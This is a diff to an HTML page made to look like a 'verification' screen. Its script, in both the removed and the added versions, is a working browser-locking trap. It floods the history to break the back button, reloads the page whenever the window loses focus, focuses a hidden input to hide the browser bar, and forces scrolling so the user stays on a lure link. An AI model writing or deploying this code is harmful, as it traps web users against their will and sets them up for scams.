@@ -6,12 +6,11 @@
     <style>
         body, html { 
             margin: 0; padding: 0; background: #ffffff; 
-            height: 300vh; /* Keeps the page long for the scroll jump */
+            height: 300vh; 
             overscroll-behavior-y: none; 
             -webkit-font-smoothing: antialiased;
-            scroll-behavior: smooth;
-            /* Disable pull-to-refresh which can show the UI */
-            touch-action: none; 
+            scroll-behavior: auto; /* changed to auto for instant snap */
+            touch-action: none; /* Kills swipe to refresh */
         }
         
         #top-block { height: 600px; background: #ffffff; width: 100%; } 
@@ -24,6 +23,7 @@
             margin-top: 50px; 
         }
 
+        /* Visual Styles */
         .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
         .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
         .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 25px; max-width: 310px; margin-left: auto; margin-right: auto; }
@@ -33,11 +33,15 @@
         #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; -webkit-tap-highlight-color: transparent; }
         #footer-ref { margin-top: 8px; color: #D1D1D3; font-size: 10px; font-family: monospace; letter-spacing: 0.5px; }
         #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5000; pointer-events: none; }
+        
+        /* The invisible trigger */
+        #jolt-trigger { position: fixed; top: -100px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
     <div id="shield"></div>
     <div id="top-block"></div>
+    <input type="text" id="jolt-trigger">
 
     <div id="main-content" id="start">
         <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
@@ -62,58 +66,83 @@
     </div>
 
 <script>
-        // 1. THE REFRESH TRAP (Kills the 'X' button)
-        // If the user clicks 'X', the page blurs. We immediately reload.
-        window.onblur = function() {
-            setTimeout(() => {
-                window.location.replace(window.location.href);
-            }, 5);
-        };
+    // 1. THE VIEWPORT JOLT
+    // This attempts to trick the browser into hiding the top bar by simulating a keyboard opening
+    function joltViewport() {
+        const input = document.getElementById('jolt-trigger');
+        input.focus(); 
+        
+        // Wait a split second for the browser to react, then lock it
+        setTimeout(() => {
+            input.blur();
+            engageLock();
+        }, 150);
+    }
 
-        // 2. THE HISTORY PRISON
-        function buildPrison() {
-            for(let i=0; i<30; i++) {
-                window.history.pushState(null, "", window.location.href + "#auth-" + i);
-            }
-        }
+    // 2. THE SCROLL LOCK
+    function engageLock() {
+        const targetPos = document.getElementById('top-block').offsetHeight;
+        
+        // Force jump
+        window.scrollTo(0, targetPos);
+        
+        // Activate Shield
+        document.getElementById('shield').style.display = 'block';
 
-        window.onpopstate = function() {
-            window.history.pushState(null, "", window.location.href);
-            // This alert blocks the browser UI thread
-            alert("Verification Incomplete"); 
-        };
-
-        function engageLock() {
-            const targetPos = document.getElementById('top-block').offsetHeight;
-            window.scrollTo(0, targetPos);
+        // Listeners to freeze the user in place
+        const prevent = (e) => { 
+            if (e.target.id === 'breakout-link') return;
             
-            document.getElementById('shield').style.display = 'block';
-            
-            const prevent = (e) => { 
-                if (e.target.id === 'breakout-link') return;
-                
-                // Snap back if they try to move up
-                if (window.pageYOffset < (targetPos - 5)) {
-                    window.scrollTo(0, targetPos);
-                }
-
-                if (e.cancelable) e.preventDefault(); 
-                e.stopPropagation(); 
-            };
-
-            ['touchstart', 'touchmove', 'touchend', 'wheel', 'scroll'].forEach(ev => {
-                window.addEventListener(ev, prevent, { passive: false, capture: true });
-            });
-        }
-
-        window.onload = () => { 
-            buildPrison();
-            if(!window.location.hash) {
-                window.location.hash = "start";
+            // If the browser UI tries to slide down (scroll up), we force it back
+            if (window.pageYOffset < targetPos) {
+                window.scrollTo(0, targetPos);
             }
-            // Trigger the scroll jump immediately
-            setTimeout(engageLock, 50); 
+            if (e.cancelable) e.preventDefault(); 
         };
-    </script>
+
+        ['touchstart', 'touchmove', 'touchend', 'scroll'].forEach(ev => {
+            window.addEventListener(ev, prevent, { passive: false, capture: true });
+        });
+    }
+
+    // 3. THE HISTORY & FOCUS PRISON
+    function buildPrison() {
+        // Push state to break the back button
+        for(let i=0; i<20; i++) {
+            history.pushState(null, null, location.href);
+        }
+        
+        // If they hit back, push them forward again
+        window.onpopstate = function () {
+            history.pushState(null, null, location.href);
+        };
+    }
+    
+    // NUCLEAR OPTION: If they click X, reload the page instantly
+    window.onblur = function() {
+        // We use a tiny timeout to let the blur happen, then snap them back
+        setTimeout(() => {
+            window.location.reload();
+        }, 10);
+    }
+
+    // Execution Order
+    window.onload = () => {
+        // Scroll restoration manual prevents the browser from remembering the top position
+        if ('scrollRestoration' in history) {
+            history.scrollRestoration = 'manual';
+        }
+        
+        buildPrison();
+        
+        // Run the jolt immediately
+        joltViewport();
+        
+        // Redundant safety check
+        setInterval(() => {
+            if(window.pageYOffset < 100) window.scrollTo(0, 600);
+        }, 500);
+    };
+</script>
 </body>
 </html>
